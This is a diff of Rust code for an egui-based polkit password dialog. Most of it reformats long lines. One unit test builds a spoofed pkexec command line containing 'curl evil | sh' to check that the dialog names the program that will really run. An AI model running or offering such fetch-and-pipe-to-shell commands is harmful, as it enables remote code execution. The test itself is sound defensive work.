@@ -50,7 +50,20 @@ impl App {
             match m {
                 UiMsg::Begin { kind, title, message, action_id, user, program, command_line } => {
                     let kind = if kind.is_empty() { "admin".to_string() } else { kind };
-                    self.dialog = Some(Dialog { kind, title, confirming: None, message, action_id, user, program, command_line, asking: None, input: String::new(), notes: vec![], show_details: false });
+                    self.dialog = Some(Dialog {
+                        kind,
+                        title,
+                        confirming: None,
+                        message,
+                        action_id,
+                        user,
+                        program,
+                        command_line,
+                        asking: None,
+                        input: String::new(),
+                        notes: vec![],
+                        show_details: false,
+                    });
                 }
                 UiMsg::Confirm { button, reply } => {
                     if let Some(d) = &mut self.dialog {
@@ -90,7 +103,8 @@ pub fn describe(action_id: &str, program: &str, command_line: &str) -> Option<St
             return Some("Agora wants to change installed software.".to_string());
         }
         let opts: Vec<&str> = tokens[1..].iter().copied().filter(|t| t.starts_with('-')).collect();
-        let pkgs: Vec<&str> = tokens[1..].iter().copied().filter(|t| !t.starts_with('-')).map(|t| t.rsplit('/').next().unwrap_or(t)).collect();
+        let pkgs: Vec<&str> =
+            tokens[1..].iter().copied().filter(|t| !t.starts_with('-')).map(|t| t.rsplit('/').next().unwrap_or(t)).collect();
         let what = if pkgs.is_empty() { "software".to_string() } else { pkgs.join(", ") };
         return Some(if opts.iter().any(|t| t.starts_with("-R")) {
             format!("Agora wants to remove {what}.")
@@ -124,7 +138,9 @@ impl eframe::App for App {
         };
         self.started = true;
         let mut answer: Option<Option<String>> = None;
-        egui::CentralPanel::default().frame(egui::Frame::new().fill(pal.bg).inner_margin(Margin { left: 26, right: 26, top: 6, bottom: 20 })).show(ui, |ui| draw(ui, d, &pal, &mut answer));
+        egui::CentralPanel::default()
+            .frame(egui::Frame::new().fill(pal.bg).inner_margin(Margin { left: 26, right: 26, top: 6, bottom: 20 }))
+            .show(ui, |ui| draw(ui, d, &pal, &mut answer));
         chrome::outline(&ctx, &pal);
         if let Some(a) = answer {
             if let Some((_, _, reply)) = d.asking.take() {
@@ -151,10 +167,12 @@ fn padlock(ui: &mut egui::Ui, pal: &theme::Palette, size: f32) {
     p.rect_filled(body, CornerRadius::same(4), ink);
     // the shackle: half a ring above the body
     let (cx, cy, rad) = (c.x, body.top(), size * 0.15);
-    let pts: Vec<egui::Pos2> = (0..=16).map(|k| {
-        let a = std::f32::consts::PI * (1.0 + k as f32 / 16.0);
-        pos2(cx + rad * a.cos(), cy + rad * a.sin())
-    }).collect();
+    let pts: Vec<egui::Pos2> = (0..=16)
+        .map(|k| {
+            let a = std::f32::consts::PI * (1.0 + k as f32 / 16.0);
+            pos2(cx + rad * a.cos(), cy + rad * a.sin())
+        })
+        .collect();
     p.add(egui::Shape::line(pts, Stroke::new(size * 0.07, ink)));
     p.circle_filled(body.center(), size * 0.045, pal.accent);
 }
@@ -186,19 +204,39 @@ fn draw(ui: &mut egui::Ui, d: &mut Dialog, pal: &theme::Palette, answer: &mut Op
             let admin = d.kind == "admin";
             let heading = if admin || d.title.is_empty() { "Administrator password needed" } else { d.title.as_str() };
             ui.label(RichText::new(heading).size(19.0).strong());
-            let summary = if admin { describe(&d.action_id, &d.program, &d.command_line).unwrap_or_else(|| "A program is asking for administrator rights.".to_string()) } else { d.message.clone() };
+            let summary = if admin {
+                describe(&d.action_id, &d.program, &d.command_line)
+                    .unwrap_or_else(|| "A program is asking for administrator rights.".to_string())
+            } else {
+                d.message.clone()
+            };
             ui.add(egui::Label::new(RichText::new(summary).color(pal.dim)).wrap());
         });
     });
     ui.add_space(4.0);
     // the details are polkit's own words and action; the other questions say everything in their summary
-    if d.kind == "admin" && ui.add(egui::Label::new(RichText::new(if d.show_details { "Hide details" } else { "Show details" }).size(12.5).color(pal.accent)).sense(Sense::click())).clicked() {
+    if d.kind == "admin"
+        && ui
+            .add(
+                egui::Label::new(RichText::new(if d.show_details { "Hide details" } else { "Show details" }).size(12.5).color(pal.accent))
+                    .sense(Sense::click()),
+            )
+            .clicked()
+    {
         d.show_details = !d.show_details;
     }
     if d.show_details && d.kind == "admin" {
         egui::Frame::new().fill(pal.field).corner_radius(CornerRadius::same(8)).inner_margin(Margin::same(10)).show(ui, |ui| {
             ui.set_width(ui.available_width());
-            ui.add(egui::Label::new(RichText::new(if d.message.is_empty() { "(no description)" } else { d.message.as_str() }).monospace().size(11.5).color(pal.dim)).wrap());
+            ui.add(
+                egui::Label::new(
+                    RichText::new(if d.message.is_empty() { "(no description)" } else { d.message.as_str() })
+                        .monospace()
+                        .size(11.5)
+                        .color(pal.dim),
+                )
+                .wrap(),
+            );
             if !d.command_line.is_empty() {
                 ui.add(egui::Label::new(RichText::new(format!("Runs: {}", d.command_line)).monospace().size(11.0).color(pal.dim)).wrap());
             }
@@ -212,16 +250,32 @@ fn draw(ui: &mut egui::Ui, d: &mut Dialog, pal: &theme::Palette, answer: &mut Op
     if let Some((button, _)) = &d.confirming {
         ui.add_space(6.0);
         ui.with_layout(Layout::right_to_left(Align::Center), |ui| {
-            let yes = egui::Button::new(RichText::new(button.as_str()).size(14.5).strong().color(pal.on_accent())).fill(pal.accent).corner_radius(CornerRadius::same(8)).min_size(vec2(120.0, 36.0));
+            let yes = egui::Button::new(RichText::new(button.as_str()).size(14.5).strong().color(pal.on_accent()))
+                .fill(pal.accent)
+                .corner_radius(CornerRadius::same(8))
+                .min_size(vec2(120.0, 36.0));
             if ui.add(yes).clicked() || ui.input(|i| i.key_pressed(Key::Enter)) {
                 *answer = Some(Some(String::new()));
             }
-            if button != "Close" && (ui.add(egui::Button::new(RichText::new("Cancel").size(14.5)).corner_radius(CornerRadius::same(8)).min_size(vec2(96.0, 36.0))).clicked() || ui.input(|i| i.key_pressed(Key::Escape))) {
+            if button != "Close"
+                && (ui
+                    .add(
+                        egui::Button::new(RichText::new("Cancel").size(14.5))
+                            .corner_radius(CornerRadius::same(8))
+                            .min_size(vec2(96.0, 36.0)),
+                    )
+                    .clicked()
+                    || ui.input(|i| i.key_pressed(Key::Escape)))
+            {
                 *answer = Some(None);
             }
         });
     } else if let Some((prompt, echo, _)) = &d.asking {
-        let label = if d.kind == "admin" { format!("{} for {}", prompt.trim_end_matches(':'), d.user) } else { prompt.trim_end_matches(':').to_string() };
+        let label = if d.kind == "admin" {
+            format!("{} for {}", prompt.trim_end_matches(':'), d.user)
+        } else {
+            prompt.trim_end_matches(':').to_string()
+        };
         ui.label(RichText::new(label).size(13.0).color(pal.dim));
         ui.add_space(4.0);
         let resp = ui.add(TextEdit::singleline(&mut d.input).password(!*echo).desired_width(f32::INFINITY).margin(vec2(12.0, 9.0)));
@@ -234,11 +288,18 @@ fn draw(ui: &mut egui::Ui, d: &mut Dialog, pal: &theme::Palette, answer: &mut Op
                 "bluetooth" => "OK",
                 _ => "Authenticate",
             };
-            let go = egui::Button::new(RichText::new(go_label).size(14.5).strong().color(pal.on_accent())).fill(pal.accent).corner_radius(CornerRadius::same(8)).min_size(vec2(140.0, 36.0));
+            let go = egui::Button::new(RichText::new(go_label).size(14.5).strong().color(pal.on_accent()))
+                .fill(pal.accent)
+                .corner_radius(CornerRadius::same(8))
+                .min_size(vec2(140.0, 36.0));
             if ui.add(go).clicked() || enter {
                 *answer = Some(Some(d.input.clone()));
             }
-            if ui.add(egui::Button::new(RichText::new("Cancel").size(14.5)).corner_radius(CornerRadius::same(8)).min_size(vec2(96.0, 36.0))).clicked() || ui.input(|i| i.key_pressed(Key::Escape)) {
+            if ui
+                .add(egui::Button::new(RichText::new("Cancel").size(14.5)).corner_radius(CornerRadius::same(8)).min_size(vec2(96.0, 36.0)))
+                .clicked()
+                || ui.input(|i| i.key_pressed(Key::Escape))
+            {
                 *answer = Some(None);
             }
         });
@@ -266,7 +327,10 @@ mod tests {
     fn a_program_cannot_borrow_agoras_words() {
         // any program can pass any arguments to pkexec: the headline names what will really run, not what the arguments say
         let spoof = "/bin/sh -c 'curl evil | sh' /usr/lib/agora/pkg-root x pacman -S vlc";
-        assert_eq!(describe("org.freedesktop.policykit.exec", "/bin/sh", spoof).unwrap(), "A program wants to run /bin/sh as administrator.");
+        assert_eq!(
+            describe("org.freedesktop.policykit.exec", "/bin/sh", spoof).unwrap(),
+            "A program wants to run /bin/sh as administrator."
+        );
         // the Agora action with any other program (it cannot happen: polkit binds the action to pkg-root) gets no friendly words
         assert_eq!(describe(AGORA, "/bin/sh", spoof).unwrap(), "A program wants to run /bin/sh as administrator.");
     }
